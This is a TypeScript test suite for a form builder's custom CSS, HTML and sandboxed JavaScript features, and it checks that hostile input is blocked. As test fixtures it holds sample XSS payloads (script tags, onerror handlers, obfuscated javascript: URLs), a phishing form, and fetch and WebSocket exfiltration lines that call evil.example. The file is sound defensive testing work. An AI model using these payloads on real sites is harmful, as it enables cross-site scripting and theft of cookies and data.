/**
 * Automated Tests for FlexStore Form Studio — Phase 3.1: Custom Code, CSS & Advanced Styling
 *
 * Covers:
 *  1. Valid CSS compilation, formatting & selector catalog targeting
 *  2. Invalid CSS diagnostics & dangerous CSS blocking (@import, expression, javascript/data URLs, </style>, fixed positioning)
 *  3. Strict CSS scoping isolation between two distinct forms & component-level scoping
 *  4. Responsive @media CSS handling across Desktop, Tablet, Mobile previews & published output
 *  5. Safe semantic HTML sanitization (headings, lists, tables, links, images, safe inline styles)
 *  6. HTML XSS & injection attempts (<script>, on*, <svg>, <iframe srcdoc>, <form>/<input>, obfuscated URLs, unsafe inline styles)
 *  7. Safe HTML-escaped answer piping inside custom_html blocks
 *  8. Isolated Custom JS sandbox validation, CSP, opaque-origin iframe flags, postMessage token/field guards & error redaction
 *  9. Preview vs Published consistency & existing forms without customisation + lossless persistence round-trip
 *
 * Run with: npx tsx src/studio/__tests__/custom-code-styling.test.ts
 */

import assert from 'node:assert/strict';
import { FormSchema } from '../../types/form';
import {
  addComponent,
  buildCssSelectorCatalog,
  buildFormCssScopeId,
  buildSandboxSrcDoc,
  compileDocumentCustomCss,
  compileScopedCss,
  CUSTOM_CODE_SCHEMA_VERSION,
  formatCss,
  formComponentRegistry,
  migrateLegacyFormToDocument,
  pipeComponentNode,
  repairFormDocument,
  SANDBOX_CSP_POLICY,
  SANDBOX_IFRAME_ATTRS,
  sanitizeCustomHtml,
  sanitizeRuntimeErrorMessage,
  serializeDocumentToLegacyForm,
  updateComponent,
  updateCustomCode,
  validateCustomJs,
  validateFormDocument,
  validateSandboxMessage,
} from '../index';

function createBaseForm(id = 'form_alpha'): FormSchema {
  return {
    id,
    title: 'Enterprise Onboarding',
    description: 'Tell us about your team.',
    category: 'feedback',
    layoutMode: 'standard',
    theme: {
      primaryColor: '#0F766E',
      backgroundColor: '#F7F6F3',
      surfaceColor: '#FFFFFF',
      textColor: '#0B0D0F',
      fontFamily: 'Plus Jakarta Sans',
      borderRadius: 'lg',
      backgroundStyle: 'solid',
      inputStyle: 'bordered',
      enableConfetti: false,
    },
    welcomeScreen: {
      enabled: false,
      title: 'Welcome',
      subtitle: '',
      buttonText: 'Start',
    },
    thankYouScreen: {
      title: 'Thank you',
      message: 'Received.',
      showRestartButton: false,
    },
    fields: [
      { id: 'f_name', type: 'text', label: 'Full Name', required: true, step: 1 },
      { id: 'f_email', type: 'email', label: 'Work Email', required: true, step: 1 },
    ],
    steps: [{ id: 'step_1', stepNumber: 1, title: 'Details' }],
    logicRules: [],
    settings: {
      slug: id,
      isPublished: true,
      submitButtonText: 'Submit',
      allowMultipleSubmissions: true,
      isQuizMode: false,
      notifyOnSubmission: false,
      showProgressBar: true,
    },
    createdAt: '2026-01-10T10:00:00.000Z',
    updatedAt: '2026-01-11T10:00:00.000Z',
    responsesCount: 0,
  };
}

let passed = 0;
let failed = 0;

function test(name: string, fn: () => void) {
  try {
    fn();
    passed += 1;
    console.log(`  PASS  ${name}`);
  } catch (err) {
    failed += 1;
    console.error(`  FAIL  ${name}`);
    console.error(err);
  }
}

console.log('\nRunning FlexStore Form Studio — Phase 3.1 Custom Code & Styling Tests\n');

// ============================================================================
// 1. Valid CSS Compilation, Formatting & Selector Catalog
// ============================================================================

test('Compiles valid form CSS with strict scoping, formats cleanly, and builds component selector catalog', () => {
  const doc = migrateLegacyFormToDocument(createBaseForm('form_brand_1'));
  const scopeId = buildFormCssScopeId(doc.id);

  const rawCss = `
    :root { --brand-glow: rgba(15, 118, 110, 0.25); }
    .fs-card { border-radius: 20px; box-shadow: 0 12px 30px var(--brand-glow); }
    .fs-submit-btn:hover { transform: translateY(-1px); }
  `;

  const compiled = compileScopedCss(rawCss, { formId: doc.id, scopeId });
  assert.equal(compiled.valid, true, JSON.stringify(compiled.errors));
  assert.ok(compiled.scopedCss.includes(`[data-fs-form-scope="${scopeId}"]`));
  assert.ok(compiled.scopedCss.includes(`[data-fs-form-scope="${scopeId}"] .fs-card`));
  assert.ok(compiled.scopedCss.includes(`[data-fs-form-scope="${scopeId}"] .fs-submit-btn:hover`));
  // Global :root must be rewritten to the scoped root, never left unscoped
  assert.ok(!compiled.scopedCss.includes(':root'));

  // Formatter produces clean indented multi-line output
  const formatted = formatCss('.fs-card{color:#111;padding:12px;}');
  assert.ok(formatted.includes('\n  color:'));
  assert.ok(formatted.includes('\n  padding:'));

  // Selector catalog exposes both core regions and every component on the form
  const catalog = buildCssSelectorCatalog(doc);
  assert.ok(catalog.some((c) => c.selector === '.fs-card'));
  assert.ok(catalog.some((c) => c.selector === '[data-fs-component="f_name"]'));
  assert.ok(catalog.some((c) => c.selector === '[data-fs-component="f_email"]'));
});

// ============================================================================
// 2. Invalid CSS Diagnostics & Security Defenses
// ============================================================================

test('Detects invalid CSS syntax and blocks @import, </style>, expression(), unsafe URLs, and fixed positioning', () => {
  const scopeId = buildFormCssScopeId('form_sec_test');

  const brokenSyntax = compileScopedCss('.fs-card { color: red; ', {
    formId: 'form_sec_test',
    scopeId,
  });
  assert.equal(brokenSyntax.valid, false);
  assert.ok(brokenSyntax.errors.some((d) => d.code === 'UNBALANCED_BRACES'));

  // </style> tag breakout attempt rejects the entire stylesheet immediately
  const breakoutAttempt = compileScopedCss('.fs-card { color: red; } </style><script>alert(1)</script>', {
    formId: 'form_sec_test',
    scopeId,
  });
  assert.equal(breakoutAttempt.valid, false);
  assert.equal(breakoutAttempt.scopedCss, '');
  assert.ok(breakoutAttempt.errors.some((d) => d.code === 'STYLE_TAG_BREAKOUT'));

  const dangerousCss = `
    @import url("https://evil.example/steal.css");
    .fs-card {
      background-image: url("javascript:alert(1)");
      background: url("data:image/png;base64,AAAA");
      list-style-image: url("data:image/svg+xml,<svg onload=alert(1)>");
      width: expression(alert(1));
      position: fixed;
      color: #0B0D0F;
    }
  `;

  const compiled = compileScopedCss(dangerousCss, { formId: 'form_sec_test', scopeId });
  assert.ok(!compiled.scopedCss.includes('@import'));
  assert.ok(!compiled.scopedCss.includes('javascript:'));
  assert.ok(!compiled.scopedCss.includes('data:image'));
  assert.ok(!compiled.scopedCss.includes('expression('));
  assert.ok(!compiled.scopedCss.includes('position: fixed'));
  // Fixed positioning is safely downgraded to sticky so styles cannot overlay host UI
  assert.ok(compiled.scopedCss.includes('position: sticky'));
  assert.ok(compiled.scopedCss.includes('color: #0B0D0F'));
  const allDiags = [...compiled.errors, ...compiled.warnings];
  assert.ok(allDiags.some((d) => d.code === 'BLOCKED_AT_RULE'));
  assert.ok(allDiags.some((d) => d.code === 'UNSAFE_URL'));
  assert.ok(allDiags.some((d) => d.code === 'UNSAFE_VALUE'));
});

// ============================================================================
// 3. Strict CSS Scoping Isolation Between Two Forms & Component-Level CSS
// ============================================================================

test('Isolates CSS scopes completely between two distinct forms and scopes component-level CSS accurately', () => {
  let docA = migrateLegacyFormToDocument(createBaseForm('form_a'));
  docA = updateCustomCode(docA, {
    schemaVersion: CUSTOM_CODE_SCHEMA_VERSION,
    css: { enabled: true, code: '.fs-card { background: #111111; }' },
    js: { enabled: false, code: '' },
  });
  docA = updateComponent(docA, 'f_name', {
    appearance: {
      customCssEnabled: true,
      customCss: 'padding: 18px;\n& label { letter-spacing: 0.08em; }',
    },
  });

  let docB = migrateLegacyFormToDocument(createBaseForm('form_b'));
  docB = updateCustomCode(docB, {
    schemaVersion: CUSTOM_CODE_SCHEMA_VERSION,
    css: { enabled: true, code: '.fs-card { background: #EEEEEE; }' },
    js: { enabled: false, code: '' },
  });

  const scopeA = buildFormCssScopeId(docA.id);
  const scopeB = buildFormCssScopeId(docB.id);
  assert.notEqual(scopeA, scopeB);

  const outA = compileDocumentCustomCss(docA, { scopeId: scopeA });
  const outB = compileDocumentCustomCss(docB, { scopeId: scopeB });

  assert.ok(outA.scopedCss.includes(`[data-fs-form-scope="${scopeA}"] .fs-card`));
  assert.ok(!outA.scopedCss.includes(scopeB));
  assert.ok(outB.scopedCss.includes(`[data-fs-form-scope="${scopeB}"] .fs-card`));
  assert.ok(!outB.scopedCss.includes(scopeA));

  // Component-level bare declarations + & nested rules both scope strictly to [data-fs-component="f_name"]
  assert.ok(
    outA.scopedCss.includes(`[data-fs-form-scope="${scopeA}"] [data-fs-component="f_name"]`)
  );
  assert.ok(outA.scopedCss.includes('padding: 18px'));
  assert.ok(
    outA.scopedCss.includes(`[data-fs-form-scope="${scopeA}"] [data-fs-component="f_name"] label`)
  );

  // Disabling form-level CSS suppresses form rules while still allowing active component CSS
  const disabledOut = compileDocumentCustomCss(docA, {
    scopeId: scopeA,
    overrideFormCss: { enabled: false, code: '.fs-card { background: #111111; }' },
  });
  assert.ok(!disabledOut.scopedCss.includes('#111111'));
  assert.ok(disabledOut.scopedCss.includes('padding: 18px'));
});

// ============================================================================
// 4. Responsive @media Handling Across Desktop, Tablet & Mobile Previews
// ============================================================================

test('Evaluates responsive @media queries for Desktop/Tablet/Mobile preview frames and preserves @media on published forms', () => {
  let doc = migrateLegacyFormToDocument(createBaseForm('form_resp'));
  doc = updateCustomCode(doc, {
    schemaVersion: CUSTOM_CODE_SCHEMA_VERSION,
    css: {
      enabled: true,
      code: `
        .fs-card { padding: 32px; }
        @media (max-width: 768px) {
          .fs-card { padding: 20px; }
        }
        @media (max-width: 480px) {
          .fs-card { padding: 12px; }
        }
        @media (min-width: 1024px) {
          .fs-card { border-width: 2px; }
        }
      `,
    },
    js: { enabled: false, code: '' },
  });

  const scopeId = buildFormCssScopeId(doc.id);

  // Published output retains standard @media rules with scoped inner selectors
  const published = compileDocumentCustomCss(doc, { scopeId });
  assert.ok(published.scopedCss.includes('@media (max-width: 768px)'));
  assert.ok(published.scopedCss.includes('@media (max-width: 480px)'));
  assert.ok(published.scopedCss.includes('@media (min-width: 1024px)'));

  // Desktop preview (1280px): min-width 1024 matches; max-width 768 & 480 do NOT
  const desktop = compileDocumentCustomCss(doc, { scopeId, previewViewport: 'desktop' });
  assert.ok(desktop.scopedCss.includes('border-width: 2px'));
  assert.ok(!desktop.scopedCss.includes('padding: 20px'));
  assert.ok(!desktop.scopedCss.includes('padding: 12px'));

  // Tablet preview (768px): max-width 768 matches; max-width 480 & min-width 1024 do NOT
  const tablet = compileDocumentCustomCss(doc, { scopeId, previewViewport: 'tablet' });
  assert.ok(tablet.scopedCss.includes('padding: 20px'));
  assert.ok(!tablet.scopedCss.includes('padding: 12px'));
  assert.ok(!tablet.scopedCss.includes('border-width: 2px'));

  // Mobile preview (390px): both max-width 768 & 480 match; min-width 1024 does NOT
  const mobile = compileDocumentCustomCss(doc, { scopeId, previewViewport: 'mobile' });
  assert.ok(mobile.scopedCss.includes('padding: 20px'));
  assert.ok(mobile.scopedCss.includes('padding: 12px'));
  assert.ok(!mobile.scopedCss.includes('border-width: 2px'));
});

// ============================================================================
// 5. Safe Semantic HTML Sanitization
// ============================================================================

test('Sanitizes valid semantic HTML preserving headings, lists, tables, details, safe links, images, and allowlisted inline styles', () => {
  const safeHtml = `
    <div style="background-color: #F7F6F3; padding: 12px; border-radius: 10px;">
      <h3>Submission Guidelines</h3>
      <p>Read our <a href="https://example.com/terms">Terms of Service</a> or email <a href="mailto:help@example.com">support</a>.</p>
      <ul><li>Item <strong>One</strong></li><li>Item <em>Two</em></li></ul>
      <img src="https://images.example.com/logo.png" alt="Logo" width="120" />
      <details><summary>More info</summary><p>Hidden details.</p></details>
    </div>
  `;

  const res = sanitizeCustomHtml(safeHtml);
  assert.equal(res.errors.length + res.warnings.length, 0, JSON.stringify([...res.errors, ...res.warnings]));
  assert.equal(res.hadSecurityStrips, false);
  const rootElements = res.nodes.filter((n) => n.kind === 'element');
  assert.equal(rootElements.length, 1);
  const root = rootElements[0];
  assert.equal(root.kind, 'element');
  if (root.kind === 'element') {
    assert.equal(root.tag, 'div');
    assert.equal(root.style?.['background-color'], '#F7F6F3');
    assert.equal(root.style?.padding, '12px');

    // Verify safe link hardening (rel="noopener noreferrer" + target="_blank")
    const para = root.children.find((c) => c.kind === 'element' && c.tag === 'p');
    assert.ok(para && para.kind === 'element');
    const link = para.children.find((c) => c.kind === 'element' && c.tag === 'a');
    assert.ok(link && link.kind === 'element');
    assert.equal(link.attrs.href, 'https://example.com/terms');
    assert.equal(link.attrs.rel, 'noopener noreferrer');
    assert.equal(link.attrs.target, '_blank');

    // Verify safe image hardening (referrerpolicy="no-referrer", mapped to React referrerPolicy)
    const img = root.children.find((c) => c.kind === 'element' && c.tag === 'img');
    assert.ok(img && img.kind === 'element');
    assert.equal(img.attrs.src, 'https://images.example.com/logo.png');
    assert.equal(img.attrs.referrerpolicy, 'no-referrer');
  }
});

// ============================================================================
// 6. HTML XSS, Script Injection & Dangerous URL Scheme Defenses
// ============================================================================

test('Blocks scripts, event handlers, svg/iframe/form injection, entity-obfuscated javascript: URLs, and unsafe inline styles', () => {
  const hostileHtml = `
    <div>
      <script>alert('xss')</script>
      <style>body { display: none; }</style>
      <iframe srcdoc="<script>alert(1)</script>"></iframe>
      <svg onload="alert(1)"><script>alert(2)</script></svg>
      <form action="https://evil.example/phish"><input type="password" /><button>Steal</button></form>
      <img src="https://example.com/pic.png" onerror="alert('img')" onclick="steal()" />
      <a href="javascript:alert(1)">Bad JS Link</a>
      <a href="&#106;&#97;vascript:alert(1)">Obfuscated JS Link</a>
      <a href="data:text/html,<script>alert(1)</script>">Data Link</a>
      <p style="position: fixed; z-index: 99999; background: url(javascript:alert(1)); color: #0F766E;">Safe text</p>
    </div>
  `;

  const res = sanitizeCustomHtml(hostileHtml);
  const serialized = JSON.stringify(res.nodes);

  // Zero dangerous tags, handlers, or executable strings survive
  assert.ok(!serialized.includes('alert('));
  assert.ok(!serialized.includes('onerror'));
  assert.ok(!serialized.includes('onclick'));
  assert.ok(!serialized.includes('onload'));
  assert.ok(!serialized.includes('javascript:'));
  assert.ok(!serialized.includes('data:text/html'));
  assert.ok(!serialized.includes('"tag":"script"'));
  assert.ok(!serialized.includes('"tag":"iframe"'));
  assert.ok(!serialized.includes('"tag":"svg"'));
  assert.ok(!serialized.includes('"tag":"form"'));
  assert.ok(!serialized.includes('"tag":"input"'));
  assert.ok(!serialized.includes('"position"'));
  assert.ok(!serialized.includes('"zIndex"'));
  // Legitimate safe content & color survived cleanly
  assert.ok(serialized.includes('Safe text'));
  assert.ok(serialized.includes('#0F766E'));
  // Diagnostics accurately reported stripped items
  assert.equal(res.hadSecurityStrips, true);
  const htmlDiags = [...res.errors, ...res.warnings];
  assert.ok(htmlDiags.some((d) => d.code === 'BLOCKED_TAG'));
  assert.ok(htmlDiags.some((d) => d.code === 'BLOCKED_ATTRIBUTE'));
  assert.ok(htmlDiags.some((d) => d.code === 'UNSAFE_URL'));
  assert.ok(htmlDiags.some((d) => d.code === 'UNSAFE_STYLE'));
});

// ============================================================================
// 7. Safe HTML-Escaped Answer Piping inside Custom HTML Blocks
// ============================================================================

test('Escapes respondent answers piped into custom_html blocks so respondent input cannot inject HTML', () => {
  let doc = migrateLegacyFormToDocument(createBaseForm('form_pipe_html'));
  const added = addComponent(doc, 'custom_html', doc.pages[0].id, {
    content: {
      label: 'Welcome Banner',
      htmlContent: '<p>Hello <strong>{{f_name}}</strong>!</p>',
      htmlEnablePiping: true,
    },
  });
  doc = added.doc;

  const htmlNode = doc.components[added.componentId];
  const piped = pipeComponentNode(htmlNode, {
    document: doc,
    answers: { f_name: '<img src=x onerror=alert(1)>Alice' },
    variables: {},
  });

  // Angle brackets from respondent answer were HTML-escaped before sanitization
  assert.ok(piped.content.htmlContent?.includes('&lt;img'));
  const sanitized = sanitizeCustomHtml(piped.content.htmlContent || '');
  const serialized = JSON.stringify(sanitized.nodes);
  assert.ok(!serialized.includes('"tag":"img"'));
  assert.ok(serialized.includes('<img src=x onerror=alert(1)>Alice'));
});

// ============================================================================
// 8. Isolated Custom JavaScript Sandbox Security & Message Validation
// ============================================================================

test('Enforces strict Custom JS sandbox static guards, opaque-origin iframe CSP, token verification, and error redaction', () => {
  // 1. Iframe sandbox MUST NOT include allow-same-origin, allow-top-navigation, or allow-forms
  assert.equal(SANDBOX_IFRAME_ATTRS, 'allow-scripts');
  assert.ok(!SANDBOX_IFRAME_ATTRS.includes('allow-same-origin'));
  assert.ok(!SANDBOX_IFRAME_ATTRS.includes('allow-top-navigation'));
  assert.ok(!SANDBOX_IFRAME_ATTRS.includes('allow-forms'));

  // 2. Strict CSP blocks all network egress
  assert.ok(SANDBOX_CSP_POLICY.includes("default-src 'none'"));
  assert.ok(SANDBOX_CSP_POLICY.includes("connect-src 'none'"));

  // 3. Valid sandbox script passes static check and compiles into isolated srcDoc
  const goodScript = `
    flexstore.on('change', (ctx) => {
      if (ctx.fieldId === 'f_name' && ctx.value) {
        flexstore.setFieldHint('f_name', 'Looks great!');
      }
    });
  `;
  const goodCheck = validateCustomJs(goodScript);
  assert.equal(goodCheck.valid, true, JSON.stringify(goodCheck.errors));

  const srcDoc = buildSandboxSrcDoc(goodScript, 'secret_tok_123');
  assert.ok(srcDoc.includes(SANDBOX_CSP_POLICY));
  assert.ok(srcDoc.includes('Object.freeze'));

  // 4. Dangerous APIs are statically blocked
  for (const malicious of [
    'const c = document.cookie;',
    'localStorage.getItem("token");',
    'window.parent.postMessage("hack", "*");',
    'fetch("https://evil.example/exfil");',
    'new WebSocket("wss://evil.example");',
    'eval("alert(1)");',
    'const s = "</script><script>alert(1)</script>";',
  ]) {
    const check = validateCustomJs(malicious);
    assert.equal(check.valid, false, `Expected malicious JS to be blocked: ${malicious}`);
  }

  // 5. postMessage validation strictly enforces channelToken, allowedFieldIds, and payload bounds
  const allowedFields = new Set(['f_name', 'f_email']);
  assert.equal(
    validateSandboxMessage(
      { channelToken: 'wrong_tok', type: 'notice', message: 'Hi', tone: 'info' },
      'secret_tok_123',
      allowedFields
    ),
    null
  );
  assert.equal(
    validateSandboxMessage(
      { channelToken: 'secret_tok_123', type: 'set_value', fieldId: 'hidden_secret_field', value: 'x' },
      'secret_tok_123',
      allowedFields
    ),
    null
  );
  const validSet = validateSandboxMessage(
    { channelToken: 'secret_tok_123', type: 'set_value', fieldId: 'f_name', value: 'Ada' },
    'secret_tok_123',
    allowedFields
  );
  assert.deepEqual(validSet, {
    channelToken: 'secret_tok_123',
    type: 'set_value',
    fieldId: 'f_name',
    value: 'Ada',
  });

  // 6. Runtime error sanitization strips internal URLs/stack paths and secrets
  const cleanedErr = sanitizeRuntimeErrorMessage(
    'TypeError: boom at https://internal.app/secret/bundle.js:12:4 token=abc123'
  );
  assert.ok(!cleanedErr.includes('https://internal.app'));
  assert.ok(!cleanedErr.includes('abc123'));
  assert.ok(cleanedErr.includes('[redacted-url]'));
  assert.ok(cleanedErr.includes('[redacted]'));
});

// ============================================================================
// 9. Existing Forms Without Customisation, Registry Check & Persistence Round-Trip
// ============================================================================

test('Preserves existing forms without custom code cleanly and round-trips customCode, custom_html, and component CSS losslessly', () => {
  // Existing form with zero custom code stays completely clean
  const plainDoc = migrateLegacyFormToDocument(createBaseForm('form_plain'));
  assert.equal(plainDoc.customCode, undefined);
  assert.equal(compileDocumentCustomCss(plainDoc, { scopeId: 's_plain' }).scopedCss, '');
  const plainSerialized = serializeDocumentToLegacyForm(plainDoc);
  assert.equal(
    (plainSerialized.settings as unknown as Record<string, unknown>).studioCustomCode,
    undefined
  );

  // Verify custom_html is registered in ComponentRegistry
  assert.ok(formComponentRegistry.has('custom_html'));
  assert.equal(formComponentRegistry.get('custom_html')?.category, 'content');
  assert.equal(formComponentRegistry.get('custom_html')?.isQuestion, false);

  // Build form with form-level CSS, opt-in JS, custom_html block, and component CSS
  let richDoc = migrateLegacyFormToDocument(createBaseForm('form_rich'));
  richDoc = updateCustomCode(richDoc, {
    schemaVersion: CUSTOM_CODE_SCHEMA_VERSION,
    css: { enabled: true, code: '.fs-form-title { letter-spacing: -0.03em; }' },
    js: {
      enabled: true,
      timeoutMs: 300,
      code: "flexstore.on('load', () => flexstore.log('ready'));",
    },
  });
  const htmlAdd = addComponent(richDoc, 'custom_html', richDoc.pages[0].id, {
    content: {
      label: 'Privacy Note',
      htmlContent: '<p><strong>Encrypted</strong> end to end.</p>',
      htmlEnablePiping: false,
    },
  });
  richDoc = htmlAdd.doc;
  richDoc = updateComponent(richDoc, 'f_name', {
    appearance: {
      customCss: 'border-left: 3px solid #0F766E;',
      customCssEnabled: true,
    },
  });

  // Validate & repair document integrity
  assert.equal(validateFormDocument(richDoc).valid, true);
  const repaired = repairFormDocument(richDoc);
  assert.equal(repaired.customCode?.schemaVersion, CUSTOM_CODE_SCHEMA_VERSION);

  // Serialize -> re-migrate lossless round-trip
  const serialized = serializeDocumentToLegacyForm(richDoc);
  const restored = migrateLegacyFormToDocument(serialized);

  assert.equal(restored.customCode?.schemaVersion, CUSTOM_CODE_SCHEMA_VERSION);
  assert.equal(restored.customCode?.css.enabled, true);
  assert.equal(restored.customCode?.css.code, '.fs-form-title { letter-spacing: -0.03em; }');
  assert.equal(restored.customCode?.js.enabled, true);
  assert.equal(restored.customCode?.js.timeoutMs, 300);
  assert.equal(
    restored.customCode?.js.code,
    "flexstore.on('load', () => flexstore.log('ready'));"
  );

  const restoredHtml = restored.components[htmlAdd.componentId];
  assert.equal(restoredHtml.type, 'custom_html');
  assert.equal(restoredHtml.content.htmlContent, '<p><strong>Encrypted</strong> end to end.</p>');
  assert.equal(restoredHtml.content.htmlEnablePiping, false);
  assert.equal(restored.components['f_name'].appearance.customCss, 'border-left: 3px solid #0F766E;');
  assert.equal(restored.components['f_name'].appearance.customCssEnabled, true);

  // Preview vs Published parity: identical compiled CSS for the same document & scope
  const scopeId = buildFormCssScopeId(restored.id);
  const previewCss = compileDocumentCustomCss(restored, { scopeId });
  const publishedCss = compileDocumentCustomCss(migrateLegacyFormToDocument(serialized), { scopeId });
  assert.equal(previewCss.scopedCss, publishedCss.scopedCss);
});

console.log(`\nSummary: ${passed} passed, ${failed} failed\n`);
if (failed > 0) {
  process.exit(1);
}
